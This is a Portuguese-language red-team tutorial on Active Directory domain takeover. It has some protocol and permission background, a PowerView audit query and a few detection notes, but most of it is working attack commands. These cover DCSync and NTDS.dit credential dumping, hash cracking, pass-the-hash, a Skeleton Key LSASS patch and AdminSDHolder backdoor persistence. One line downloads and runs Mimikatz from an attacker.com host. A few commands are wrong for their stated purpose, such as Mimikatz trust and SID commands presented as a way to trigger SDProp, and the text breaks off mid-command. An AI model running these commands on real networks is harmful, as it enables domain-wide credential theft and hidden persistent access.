---
layout: cyber
section: active-directory
title: "DCSync e Dominância de Domínio"
---

# DCSync e Dominância de Domínio

# O que é?

DCSync e uma tecnica de obtencao de credenciais que simula o comportamento de um Domain Controller durante o processo de replicacao do Active Directory. Em vez de executar codigo no DC ou copiar fisicamente seus arquivos, o DCSync explora as permissoes de replicacao do AD para solicitar os atributos de senha de objetos de conta diretamente do DC — exatamente como um DC legitimo faria ao sincronizar com outro DC.

**MS-DRSR: o protocolo por baixo:**

O Active Directory usa um modelo de replicacao multi-master: qualquer DC pode receber alteracoes (criacao de usuario, troca de senha, modificacao de grupo), e essas alteracoes se propagam para todos os outros DCs do dominio. O protocolo responsavel por essa sincronizacao e o MS-DRSR (Directory Replication Service Remote Protocol), especificado pela Microsoft em `[MS-DRSR]`.

A funcao central do MS-DRSR e `IDL_DRSGetNCChanges()` — "me diga quais mudancas ocorreram no Naming Context (particao do AD) desde o numero de sequencia X". Quando um DC secundario precisa sincronizar, ele chama essa funcao no DC primario, recebe as mudancas, e aplica localmente. As mudancas incluem atributos como `unicodePwd` (hash NT), `supplementalCredentials` (chaves Kerberos AES128/AES256, DES, e outros formatos de credencial), e `dBCSPwd` (hash LM legado).

**O que e o NTDS.dit:**

O NTDS.dit e o banco de dados central do Active Directory. E um arquivo ESE (Extensible Storage Engine — o mesmo motor usado pelo Exchange e pelo IIS) localizado em `C:\Windows\NTDS\ntds.dit` em cada Domain Controller. Contem todos os objetos do dominio: usuarios, computadores, grupos, GPOs, trusts, e, crucialmente, os atributos de senha de cada conta — cifrados com a System Key (SYSKEY/BootKey) derivada do registro HKLM\SYSTEM.

Para decifrar o NTDS.dit e extrair hashes uteis, e necessario combinar:
- O proprio arquivo `ntds.dit`
- O hive de registro `HKLM\SYSTEM` (contem a BootKey)
- Opcionalmente, `HKLM\SECURITY` (para LSA Secrets e chaves adicionais)

O NTDS.dit esta sempre aberto e bloqueado pelo processo `NTDS.EXE` (servico AD DS) enquanto o DC esta em operacao. Nao pode ser simplesmente copiado com comandos normais — e necessario VSS (Volume Shadow Copy Service) ou `ntdsutil` para obter uma copia consistente.

**DCSync vs dump de NTDS.dit — diferencas praticas:**

```
Tecnica        | Code exec no DC | Artefatos em disco | Visibilidade de rede
---------------|-----------------|--------------------|-----------------------
DCSync         | Nenhuma         | Nenhum             | Trafego RPC do atacante
               | (so rede RPC)   |                    | para o DC (porta 445/135)
NTDS.dit (VSS) | Sim (vssadmin)  | Copia do ntds.dit  | Acesso SMB ao DC
               |                 | em disco           | mais shadow copy local
NTDS.dit       | Sim (ntdsutil)  | Copia IFM no DC    | Acesso SMB ao DC
(ntdsutil)     |                 | precisa exfiltrar  | mais IFM local
```

**Permissoes de replicacao — o que habilita DCSync:**

O AD controla quem pode chamar `IDL_DRSGetNCChanges()` com atributos de senha atraves de tres Access Control Entries (ACEs) no objeto raiz do dominio (`DC=domain,DC=com`):

```
DS-Replication-Get-Changes
  GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
  Permite replicacao de atributos nao-secretos

DS-Replication-Get-Changes-All
  GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
  Permite replicacao de atributos secretos (senhas, hashes)
  -> este e o crucial para DCSync

DS-Replication-Get-Changes-In-Filtered-Set
  GUID: 89e95b76-444d-4c62-991a-0facbeda640c
  Necessario em alguns cenarios de read-only DC (RODC)
```

A combinacao de `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` e o que permite o DCSync completo com obtencao de hashes.

# Onde é implementado?

**Replicacao AD em todo ambiente de dominio:**

Qualquer ambiente Active Directory com mais de um Domain Controller tem replicacao funcionando continuamente. A replicacao acontece:
- A cada 15 segundos dentro de um mesmo site AD (intra-site, via KCC — Knowledge Consistency Checker)
- Conforme schedule configurado entre sites diferentes (inter-site, via connection objects)
- Imediatamente para mudancas urgentes como troca de senha e bloqueio de conta (notificacao de mudanca)

Em um ambiente com 3 DCs, em media ha dezenas a centenas de chamadas `IDL_DRSGetNCChanges()` por hora circulando entre os DCs legitimamente. Uma chamada DCSync de um atacante se mistura a esse trafego — o que dificulta a deteccao baseada apenas em volume ou em porta de rede.

**Quem tem permissoes de replicacao por padrao:**

```
Grupo/Conta                      | Get-Changes | Get-Changes-All
---------------------------------|-------------|----------------
Domain Admins                    | Sim         | Sim
Enterprise Admins                | Sim         | Sim
Administrators (grupo builtin)   | Sim         | Sim
Domain Controllers               | Sim         | Sim (computadores DC)
SYSTEM no DC                     | Sim         | Sim
Read-Only Domain Controllers     | Sim         | Nao (RODC nao replica senhas)
```

**Quem frequentemente tem essas permissoes por configuracao incorreta:**

Em ambientes reais, e comum encontrar permissoes de replicacao concedidas explicitamente a:
- Contas de servico do Azure AD Connect (necessario para sincronizacao de senha com Azure AD)
- Contas de servico de ferramentas de auditoria e identidade (SolarWinds, Quest, etc.)
- Contas usadas por solucoes de backup que incluem backup do AD
- Contas adicionadas por administradores que nao compreenderam o impacto das permissoes de replicacao
- Contas antigas de projetos de migracao que nao foram removidas

Essas contas sao alvos prioritarios no reconhecimento de um red team: uma conta de servico do Azure AD Connect comprometida via Kerberoasting pode ter permissoes equivalentes a Domain Admin para fins de DCSync.

**NTDS.dit: localizacao em cada DC:**

```
Arquivo principal:
  C:\Windows\NTDS\ntds.dit          -> banco de dados principal
  C:\Windows\NTDS\ntds.jfm          -> arquivo de log de flush
  C:\Windows\NTDS\edb*.log          -> transaction logs (edb.log, edbXXXXX.log)
  C:\Windows\NTDS\edb.chk           -> checkpoint file
  C:\Windows\NTDS\res1.log          -> log reservado
  C:\Windows\NTDS\res2.log          -> log reservado

Registry hives necessarios para decifrar:
  HKLM\SYSTEM   -> C:\Windows\System32\config\SYSTEM
  HKLM\SECURITY -> C:\Windows\System32\config\SECURITY
```

Em ambientes com RODC (Read-Only Domain Controllers), o NTDS.dit do RODC contem apenas uma subconjunto das credenciais — apenas as contas explicitamente permitidas pela Password Replication Policy do RODC. O RODC nao pode executar DCSync com `Get-Changes-All` por design.

# Como funciona de forma adequada?

**Topologia de replicacao AD — modelo de replicacao real:**

O Active Directory usa um modelo de replicacao pull (por pull): cada DC solicita mudancas de seus vizinhos, em vez de os vizinhos enviarem mudancas proativamente. O KCC (Knowledge Consistency Checker) e um processo que roda em cada DC e calcula automaticamente a topologia otima de replicacao — garantindo que qualquer mudanca chegue a todos os DCs em no maximo 3 saltos (hops) dentro de um site.

```
Topologia de replicacao em ambiente com 3 DCs no mesmo site:

    DC01 <---------> DC02
      ^               ^
       \             /
        \           /
         +-> DC03 <-+

Cada seta = connection object bidirecional (criado pelo KCC)
DC01 replica de DC02 e DC03
DC02 replica de DC01 e DC03
DC03 replica de DC01 e DC02

Fluxo de mudanca (usuario troca senha em DC01):
  1. DC01 aplica mudanca localmente (grava no ntds.dit local)
  2. DC01 incrementa o USN (Update Sequence Number) da mudanca
  3. DC02 pergunta ao DC01: "Quais mudancas desde USN X?"
     -> IDL_DRSGetNCChanges(DC01, lastUSN=DC02_conhece_de_DC01)
  4. DC01 retorna mudancas, incluindo o novo hash NT do usuario
  5. DC02 aplica a mudanca em seu ntds.dit local
  6. DC03 repete o mesmo processo com DC01 e DC02
```

**USN — Update Sequence Number:**

Cada DC mantem um contador inteiro chamado USN (Update Sequence Number). A cada mudanca feita localmente, o DC incrementa seu USN e marca a mudanca com esse numero. Os outros DCs rastreiam "ate qual USN de DC01 eu ja sincronizei" para saber o que pedir nas proximas replicacoes. Isso evita replicacoes redundantes e garante convergencia eventual de todos os DCs.

**Como a replicacao funciona para atributos de senha:**

Atributos de senha (`unicodePwd`, `supplementalCredentials`, `dBCSPwd`) sao marcados como `confidential` e `secret` no schema do AD. Eles so replicam para DCs que tem a permissao `DS-Replication-Get-Changes-All`. Quando o DC solicitante tem essa permissao, o DC respondente inclui esses atributos no payload de `IDL_DRSGetNCChanges()`.

Os atributos de senha chegam cifrados com uma chave de sessao especifica da replicacao — nao em plaintext. Ferramentas como Mimikatz e secretsdump.py sabem como decifrar essa camada adicional usando a chave de sessao negociada no inicio da conexao MS-DRSR.

**VSS Shadow Copy e ntdsutil — backup legitimo do NTDS.dit:**

O VSS (Volume Shadow Copy Service) e o mecanismo do Windows para criar snapshots consistentes de volumes em uso. E a base de funcionalidades como "Versoes Anteriores" no Windows Explorer e backups com Windows Server Backup.

```
Fluxo de backup legitimo via VSS:
  1. Administrador (ou sistema de backup) solicita criacao de shadow copy
     -> vssadmin create shadow /for=C:
  2. VSS coordena com o servico AD DS para suspender writes momentaneamente
  3. VSS cria snapshot consistente do volume
  4. Admin copia C:\Windows\NTDS\ntds.dit do shadow path:
     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit
  5. Admin copia os hives de registro (SYSTEM, SECURITY) via reg save
  6. Resultado: copia offline e consistente do ntds.dit
```

O `ntdsutil` e a ferramenta oficial da Microsoft para administracao do AD DS. O subcomando `ifm` (Install From Media) cria uma copia consistente do ntds.dit mais os hives necessarios, usada originalmente para instalar novos DCs sem replicar toda a base pela rede.

```
Fluxo legitimo do ntdsutil IFM:
  1. Administrador executa: ntdsutil "activate instance ntds" "ifm"
                            "create full C:\ifm" "q" "q"
  2. ntdsutil pausa o servico AD DS momentaneamente
  3. Cria uma copia defragmentada e consistente do ntds.dit
  4. Copia os hives SYSTEM e SECURITY necessarios
  5. Estrutura resultante em C:\ifm:
       C:\ifm\Active Directory\ntds.dit
       C:\ifm\registry\SYSTEM
       C:\ifm\registry\SECURITY
  6. Novo DC instalado a partir do IFM nao precisa replicar toda a base:
       dcpromo /adv (modo restauracao de midia)
```

**Quem deve ter permissoes de replicacao — e quem nao deve:**

Do ponto de vista defensivo, as permissoes `DS-Replication-Get-Changes-All` devem existir apenas em:
- Contas de computador que sao Domain Controllers
- Contas de servico do Azure AD Connect (se sincronizacao de senha esta configurada)
- Nenhum outro principal

Qualquer conta de usuario humano com essas permissoes e um risco de seguranca. Qualquer conta de servico de terceiro com essas permissoes deve ser auditada e, se possivel, ter as permissoes removidas e substituidas por uma conta de computador DC dedicada ou pelo mecanismo correto.

---

## MS-DRSR e o Abuso Como DC Falso

### MS-DRSR — O Protocolo por Trás do DCSync

O Active Directory usa o protocolo **MS-DRSR (Directory Replication Service Remote Protocol)** para sincronizar dados entre Domain Controllers. Quando um DC secundário precisa sincronizar com o DC primário, ele chama a função `GetNCChanges()` — "me dê as mudanças do Naming Context desde a última sincronização".

DCSync explora exatamente isso: em vez de ser um DC legítimo, uma ferramenta como Mimikatz ou secretsdump.py se **faz passar por um DC** e chama `GetNCChanges()` solicitando os dados de objetos específicos — incluindo os atributos de senha (`unicodePwd`, `supplementalCredentials`, `dBCSPwd`).

**Por que o DC atende essa requisição?**

Porque verificar se quem está fazendo a chamada é um DC legítimo ou apenas uma conta com as permissões certas requer que o DC valide as **permissões de replicação** no objeto `DC=domain,DC=com`. Qualquer conta (usuário, computador, serviço) com os rights de replicação corretos pode chamar `GetNCChanges()` com sucesso.

### Permissões Necessárias para DCSync

No objeto raiz do domínio (`DC=domain,DC=com`), as seguintes permissões (Access Control Entries) permitem replicação de senhas:

```
DS-Replication-Get-Changes         GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
DS-Replication-Get-Changes-All     GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
DS-Replication-Get-Changes-In-Filtered-Set  GUID: 89e95b76-444d-4c62-991a-0facbeda640c
```

**Quem tem essas permissões por padrão:**
- Domain Admins
- Enterprise Admins
- Administrators (grupo)
- Domain Controllers (computadores que são DCs)
- SYSTEM no DC

**Quem frequentemente tem adicionado explicitamente (configurações incorretas):**
- Service accounts para ferramentas de sincronização (AD Connect, SolarWinds, etc.)
- Contas de terceiros para ferramentas de auditoria
- Contas usadas por soluções de backup que incluem AD
- Contas adicionadas por administradores por engano

### NTDS.dit — O Banco de Dados do AD

O arquivo `NTDS.dit` é o banco de dados ESE (Extensible Storage Engine) que armazena todos os objetos do Active Directory — usuários, computadores, grupos, políticas, e **hashes de senhas**.

Localização padrão: `C:\Windows\NTDS\ntds.dit`

Para decriptar os hashes no NTDS.dit, são necessárias:
- A chave de criptografia do System hive: `HKLM\SYSTEM` (especificamente a SYSKEY/BootKey)
- Os dados do Security hive: `HKLM\SECURITY` (para LSA Secrets)

O `NTDS.dit` está sempre em uso pelo serviço AD DS — não pode ser simplesmente copiado enquanto o sistema está rodando. Para acessá-lo, são usadas duas abordagens:
1. **VSS (Volume Shadow Copy Service)** — criar shadow copy do volume e copiar de lá
2. **ntdsutil** — ferramenta oficial da Microsoft para manutenção do AD que cria cópia consistente

### AdminSDHolder — O Mecanismo de Proteção que Vira Arma

O `AdminSDHolder` é um objeto especial no Active Directory localizado em `CN=AdminSDHolder,CN=System,DC=domain,DC=com`. Sua função é **proteger contas privilegiadas** de modificações acidentais de ACL.

Como funciona o mecanismo legítimo:
1. O processo `SDProp` (Security Descriptor Propagator) roda **a cada 60 minutos** no PDC Emulator
2. SDProp lê a ACL do objeto AdminSDHolder
3. Copia essa ACL para todas as contas e grupos "protegidos" (Domain Admins, Enterprise Admins, etc.)
4. Isso **sobrescreve** qualquer modificação de ACL feita nessas contas — proteção contra escalação inadvertida

O abuso: se o atacante **modifica a ACL do AdminSDHolder** para incluir uma conta comprometida com permissões de controle, em até 60 minutos essa permissão se propaga automaticamente para **todas as contas e grupos protegidos do domínio**. O SDProp, tentando "proteger" o domínio, está na verdade aplicando a backdoor do atacante repetidamente.

---

## Na Prática

### Verificar Quem Tem Permissões de DCSync

Antes de executar, identificar quais contas têm essas permissões é útil tanto para o red team (encontrar caminhos alternativos) quanto para o blue team.

```powershell
# PowerView — quem tem DS-Replication-Get-Changes e DS-Replication-Get-Changes-All
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match "DS-Replication-Get-Changes" } |
    Select-Object SecurityIdentifier, ObjectAceType, AceType |
    Sort-Object ObjectAceType

# Resolver SIDs para nomes legíveis
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match "DS-Replication-Get-Changes" } |
    ForEach-Object {
        $sid = $_.SecurityIdentifier
        $name = (Convert-SidToName $sid)
        [PSCustomObject]@{
            Name = $name
            SID = $sid
            Right = $_.ObjectAceType
        }
    } | Sort-Object Name
```

```cypher
-- BloodHound — quem pode fazer DCSync
MATCH p=(n)-[:DCSync|GetChanges|GetChangesAll|GetChangesInFilteredSet]->(d:Domain)
RETURN n.name, type(n), [r IN relationships(p) | type(r)] AS rights
ORDER BY n.name
```

```bash
# Impacket — verificar via LDAP
ldapsearch -x -H ldap://DC_IP \
    -D "domain\user" \
    -w 'password' \
    -b "DC=corp,DC=local" \
    -s base \
    "(objectClass=*)" \
    nTSecurityDescriptor
# (output requer parsing do Security Descriptor binário)

# Alternativa com ldap3 (Python)
python3 -c "
import ldap3
server = ldap3.Server('DC_IP')
conn = ldap3.Connection(server, 'domain\\\\user', 'password', auto_bind=True)
conn.search('DC=corp,DC=local', '(objectClass=*)', attributes=['nTSecurityDescriptor'])
print(conn.entries[0])
"
```

---

## Exemplos de Código / Comandos

### DCSync com Mimikatz (Windows)

```powershell
# Pré-requisito: conta com DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
# Não precisa de privilégios locais no DC — apenas permissões de replicação

# ================================================================
# Dump de conta específica — krbtgt (para Golden Ticket)
lsadump::dcsync /user:corp\krbtgt

# Output detalhado esperado:
# [DC] 'corp.local' will be the domain
# [DC] 'DC01.corp.local' will be the DC server
# Object RDN           : krbtgt
# ** SAM ACCOUNT **
# SAM Username         : krbtgt
# Account Type         : 30000000 ( USER_OBJECT )
# User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
# Account expiration   :
# Password last change : 01/01/2020 00:00:00
# Object Security ID   : S-1-5-21-XXXX-XXXX-XXXX-502
# Object Relative ID   : 502
# Credentials:
#   Hash NTLM: aabbccddeeff00112233445566778899
#     ntlm- 0: aabbccddeeff00112233445566778899
#     lm  - 0: (vazio em Windows modernos)
# Supplemental Credentials:
# * Primary:Kerberos-Newer-Keys *
#     Default Salt : CORP.LOCALkrbtgt
#     Default Iterations : 4096
#     Credentials
#       aes256_hmac (4096) : [AES256 KEY]
#       aes128_hmac (4096) : [AES128 KEY]

# ================================================================
# Dump do Administrator (para PTH e acesso imediato)
lsadump::dcsync /user:corp\Administrator

# ================================================================
# Dump de service account específico
lsadump::dcsync /user:corp\svc_sql

# ================================================================
# Dump de TODOS os usuários do domínio (barulhento — gera muito tráfego)
lsadump::dcsync /domain:corp.local /all /csv

# Salvar saída em arquivo
lsadump::dcsync /domain:corp.local /all /csv > C:\temp\domain_hashes.csv

# ================================================================
# DCSync contra domínio específico (útil em ambientes multi-domínio)
lsadump::dcsync /domain:child.corp.local /user:child\krbtgt /dc:child-dc.child.corp.local

# ================================================================
# Via PowerShell com Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'

# ================================================================
# DCSync via Shell remoto (PowerShell Remoting)
Invoke-Command -ComputerName DC01.corp.local -ScriptBlock {
    # Executar Mimikatz no DC remotamente (precisa de admin no DC)
    C:\temp\mimikatz.exe "lsadump::dcsync /user:corp\krbtgt" "exit"
}
```

---

### DCSync com Impacket secretsdump.py (Linux)

```bash
# ================================================================
# Com credenciais de texto plano
secretsdump.py corp.local/Administrator:Password123@DC01.corp.local

# ================================================================
# Apenas hashes NTLM (mais rápido, menos verbose)
secretsdump.py corp.local/Administrator:Password123@DC01.corp.local \
    -just-dc-ntlm

# Saída típica:
# corp.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:aabbccddeeff00112233445566778899:::
# corp.local\usuario1:1105:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# Formato: dominio\usuario:RID:LM_hash:NT_hash:::
# LM hash moderno é sempre aad3b435b51404eeaad3b435b51404ee (hash de string vazia)

# ================================================================
# Dump apenas do krbtgt
secretsdump.py corp.local/Administrator:Password123@DC01.corp.local \
    -just-dc-user krbtgt

# ================================================================
# Dump completo incluindo chaves Kerberos (AES128, AES256)
secretsdump.py corp.local/Administrator:Password123@DC01.corp.local \
    -just-dc

# Saída adicional com chaves Kerberos:
# [*] Kerberos keys grabbed
# corp.local\krbtgt:aes256-cts-hmac-sha1-96:[AES256_KEY]
# corp.local\krbtgt:aes128-cts-hmac-sha1-96:[AES128_KEY]
# corp.local\krbtgt:des-cbc-md5:[DES_KEY]

# ================================================================
# Com hash NT (Pass-the-Hash para autenticar)
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
    corp.local/Administrator@DC01.corp.local \
    -just-dc-ntlm

# ================================================================
# Com ticket Kerberos
export KRB5CCNAME=/tmp/Administrator.ccache
secretsdump.py -k -no-pass corp.local/Administrator@DC01.corp.local \
    -just-dc-ntlm

# ================================================================
# Salvar saída em arquivo e filtrar
secretsdump.py corp.local/Administrator:Password123@DC01.corp.local \
    -just-dc-ntlm \
    -outputfile /tmp/domain_hashes

# Arquivo gerado: /tmp/domain_hashes.ntds
# Extrair apenas NT hashes para crack
cut -d: -f4 /tmp/domain_hashes.ntds > /tmp/nt_hashes.txt

# ================================================================
# Apenas LSA Secrets (sem NTDS — para senhas de serviços locais)
secretsdump.py corp.local/Administrator:Password123@DC01.corp.local \
    -just-dc-user '' \
    -lsa-secrets
```

---

### NTDS.dit — Dump Offline

```powershell
# ================================================================
# MÉTODO 1: VSS (Volume Shadow Copy) — manual

# Criar shadow copy do volume C:
vssadmin create shadow /for=C:

# Output:
# Successfully created shadow copy for 'C:\'
# Shadow Copy ID: {GUID}
# Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Copiar NTDS.dit do shadow copy (não fica bloqueado pelo serviço AD)
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit" C:\temp\ntds.dit

# Copiar hives do registry (necessários para decriptar)
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Listar shadow copies existentes (não criar nova se já existe)
vssadmin list shadows /for=C:

# Limpar shadow copy após uso
vssadmin delete shadows /shadow={GUID} /quiet

# ================================================================
# MÉTODO 2: ntdsutil — cria cópia consistente (método oficial)

# ntdsutil cria uma cópia consistente com IFM (Install From Media)
# Mais confiável que VSS manual para ambientes com replicação ativa
ntdsutil "activate instance ntds" "ifm" "create full c:\ifm" "q" "q"

# Estrutura criada em C:\ifm:
# C:\ifm\
#   Active Directory\
#     ntds.dit            ← banco de dados
#   registry\
#     SECURITY            ← security hive
#     SYSTEM              ← system hive (contém SYSKEY/BootKey)

# Com Active Directory PowerShell module (alternativa mais limpa)
Import-Module ActiveDirectory
# Criar IFM
Start-Process ntdsutil -ArgumentList '"activate instance ntds" "ifm" "create full c:\ifm" "q" "q"' -Wait

# ================================================================
# MÉTODO 3: Via WMI remotamente (se tem admin no DC)
Invoke-WmiMethod -Class Win32_Process -Name Create \
    -ArgumentList 'cmd.exe /c ntdsutil "activate instance ntds" "ifm" "create full c:\ifm" "q" "q"' \
    -ComputerName DC01.corp.local

# Após criação, copiar via SMB
Copy-Item -Path "\\DC01.corp.local\C$\ifm" -Destination "C:\temp\ifm" -Recurse

# ================================================================
# MÉTODO 4: Via shadow copy com PowerShell (mais automatizado)
$shadowCopyQuery = Get-WmiObject -Class Win32_ShadowCopy
if (-not $shadowCopyQuery) {
    $shadowCopy = (Get-WmiObject -Class Win32_ShadowCopy -List).Create("C:\", "ClientAccessible")
    $shadow = Get-WmiObject -Class Win32_ShadowCopy | Where-Object { $_.ID -eq $shadowCopy.ShadowID }
} else {
    $shadow = $shadowCopyQuery | Select-Object -Last 1
}

$shadowPath = $shadow.DeviceObject + "\"
cmd /c mklink /d C:\temp\shadow "$shadowPath"
Copy-Item "C:\temp\shadow\Windows\NTDS\ntds.dit" "C:\temp\ntds.dit"
reg save HKLM\SYSTEM C:\temp\SYSTEM /y
reg save HKLM\SECURITY C:\temp\SECURITY /y
```

---

### Processar NTDS.dit Offline com secretsdump.py

```bash
# ================================================================
# Processar NTDS.dit localmente — APENAS NT hashes
secretsdump.py -ntds /tmp/ntds.dit \
    -system /tmp/SYSTEM \
    LOCAL

# Output:
# [*] Target system bootKey: 0xABCDEF1234567890...
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:aabbccddeeff00112233445566778899:::
# ...

# ================================================================
# Com SECURITY também (para LSA Secrets — senhas de serviços)
secretsdump.py -ntds /tmp/ntds.dit \
    -system /tmp/SYSTEM \
    -security /tmp/SECURITY \
    LOCAL

# Inclui adicionalmente:
# [*] Dumping cached domain logon information (domain/username:hash)
# [*] Dumping LSA Secrets
# $MACHINE.ACC: [hash da conta de computador]
# DPAPI_SYSTEM: [chaves DPAPI]
# NL$KM: [NetLogon session key]
# _SC_svc_sql: [senha do serviço svc_sql em plaintext!]

# ================================================================
# Salvar saída e extrair somente NT hashes para crack
secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL \
    | tee /tmp/full_dump.txt

# Extrair apenas NT hashes (campo 4)
grep ":::" /tmp/full_dump.txt | cut -d: -f4 | sort -u > /tmp/nt_hashes_only.txt

# Extrair apenas usuários habilitados (excluir $) e seus hashes
grep ":::" /tmp/full_dump.txt | grep -v '\$' | cut -d: -f1,4 > /tmp/user_nthash.txt

# ================================================================
# Alternativa com impacket-secretsdump (alias em algumas distros)
impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/SYSTEM LOCAL

# ================================================================
# Usando DSInternals (PowerShell — alternativa no Windows)
Install-Module DSInternals -Force
Import-Module DSInternals

# Obter boot key do SYSTEM hive
$key = Get-BootKey -SystemHivePath "C:\temp\SYSTEM"

# Extrair hashes do NTDS.dit
Get-ADDBAccount -All -DBPath "C:\temp\ntds.dit" -BootKey $key |
    Select-Object SamAccountName, SID, Enabled,
        @{N='NTHash';E={[System.BitConverter]::ToString($_.NTHash).Replace('-','').ToLower()}} |
    Export-Csv C:\temp\hashes.csv -NoTypeInformation

# Ver contas desabilitadas separadamente
Get-ADDBAccount -All -DBPath "C:\temp\ntds.dit" -BootKey $key |
    Where-Object { -not $_.Enabled } |
    Select-Object SamAccountName, NTHash
```

---

### Quebrar Hashes do NTDS.dit

```bash
# ================================================================
# Hashcat — NT hashes (modo 1000)
hashcat -m 1000 /tmp/nt_hashes_only.txt /usr/share/wordlists/rockyou.txt

# Com regras (aumenta muito as chances)
hashcat -m 1000 /tmp/nt_hashes_only.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule \
    --force

# CrackStation wordlist (15GB — recomendado para ambientes reais)
hashcat -m 1000 /tmp/nt_hashes_only.txt \
    /opt/wordlists/crackstation-human-only.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Ataque de máscara (padrão corporativo Empresa@Ano)
hashcat -m 1000 -a 3 /tmp/nt_hashes_only.txt \
    "?u?l?l?l?l?l@?d?d?d?d"

# Verificar resultados
hashcat -m 1000 /tmp/nt_hashes_only.txt --show
# Output: hash:senha_quebrada

# ================================================================
# John the Ripper
john /tmp/nt_hashes.txt \
    --format=nt \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    --rules=Jumbo

john /tmp/nt_hashes.txt --format=nt --show

# ================================================================
# Pass-the-Hash com hashes obtidos (sem precisar quebrar)
# Acesso imediato com hash NT — não precisa da senha em plaintext!

# CME (CrackMapExec)
crackmapexec smb 192.168.1.0/24 \
    -u Administrator \
    -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Impacket psexec
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
    corp.local/Administrator@DC01.corp.local

# Impacket wmiexec
wmiexec.py -hashes :NTHASH corp.local/Administrator@192.168.1.10
```

---

### Skeleton Key com Mimikatz

```powershell
# ================================================================
# Skeleton Key — patcha LSASS em memória para aceitar senha universal

# IMPORTANTE: Requer execução NO PRÓPRIO DC com privilégios SYSTEM/Debug
# Não persiste após reinicialização
# Detectado por soluções avançadas de EDR

# No Domain Controller:
privilege::debug
# Output: Privilege '20' OK

misc::skeleton

# Output esperado:
# [KDC] data
# [RC4] NTLM
# [aes128] Kerberos HMAC-AES128 - rc4_md4, netlogon, dc
# [aes256] Kerberos HMAC-AES256 - rc4_md4, netlogon, dc
# [!] Kernel support requested, injecting dll
# [+] Installing Skeleton Key [WDigest]

# Após isso, qualquer usuário do domínio pode autenticar com a senha "mimikatz"
# (além da senha real — ambas funcionam)

# Teste de autenticação com skeleton key:
net use \\DC01.corp.local\C$ /user:corp\Administrator mimikatz

# Ou via PowerShell
New-PSDrive -Name Z -PSProvider FileSystem \
    -Root \\DC01.corp.local\C$ \
    -Credential (New-Object PSCredential("corp\Administrator", (ConvertTo-SecureString "mimikatz" -AsPlainText -Force)))

# ================================================================
# Verificar se Skeleton Key está ativa (do atacante)
# Tentar autenticar qualquer usuário com "mimikatz" como senha

# ================================================================
# Notas importantes sobre Skeleton Key:
# 1. NÃO persiste após reinicialização do DC
# 2. Não replica automaticamente para outros DCs
#    (precisa ser aplicada em cada DC separadamente)
# 3. Detectado por:
#    - Microsoft Defender for Identity (alerta específico)
#    - Soluções EDR que monitoram patches em LSASS
#    - Event 4673 (sensitive privilege use) / 4672
# 4. Alguns AV/EDR bloqueiam a injeção de DLL no LSASS
# 5. Útil em emergência quando precisa manter acesso temporário
#    enquanto outras técnicas de persistência são estabelecidas
```

---

### AdminSDHolder — Persistência Automática

```powershell
# ================================================================
# AdminSDHolder Abuse — adicionar ACE que propaga para contas protegidas

# Pré-requisito: Domain Admin ou permissão de escrita no AdminSDHolder

# Verificar ACL atual do AdminSDHolder
Get-DomainObjectAcl \
    -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    -ResolveGUIDs |
    Select-Object SecurityIdentifier, ActiveDirectoryRights, ObjectAceType

# Adicionar controle total para conta comprometida/backdoor
Add-DomainObjectAcl \
    -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    -PrincipalIdentity "backdoor_user" \
    -Rights All \
    -Domain corp.local

# Alternativas de direitos mais específicos (menos óbvios que "All"):
# DCSync rights — permite replicação
Add-DomainObjectAcl \
    -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    -PrincipalIdentity "backdoor_user" \
    -Rights DCSync

# Forçar SDProp a rodar imediatamente (sem esperar os 60 min)
# Requer acesso ao PDC Emulator
Invoke-Command -ComputerName PDCE.corp.local -ScriptBlock {
    $ldappath = "LDAP://CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local"
    $configNC = [ADSI]$ldappath
    $configNC.Put("fixUpInheritance", 1)
    $configNC.SetInfo()
}
# Ou via Mimikatz:
lsadump::trust /patch
misc::addsid backdoor_user S-1-5-21-...-519

# ================================================================
# Após SDProp executar (até 60 min), verificar que propagou:
Get-DomainObjectAcl \
    -Identity "Domain Admins" \
    -ResolveGUIDs |
